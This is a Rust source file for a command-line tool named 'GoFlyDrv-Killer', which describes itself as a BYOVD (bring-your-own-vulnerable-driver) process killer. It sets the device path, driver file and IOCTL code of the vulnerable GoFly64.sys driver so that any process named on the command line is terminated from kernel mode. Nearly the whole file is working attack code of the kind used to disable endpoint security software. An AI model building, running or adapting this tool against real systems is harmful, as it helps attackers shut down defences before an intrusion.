use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - GoFlyDrv
// ============================================================================

struct GoFlyDrv;

impl DriverConfig for GoFlyDrv {
    fn driver_name(&self) -> &str {
        "GoFly64"
    }

    fn driver_file(&self) -> &str {
        "GoFly64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\GoFly"
    }

    fn ioctl_code(&self) -> u32 {
        0x12227A
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "GoFlyDrv-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using GoFlyDrv")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&GoFlyDrv, &cli.process_name, None)
}
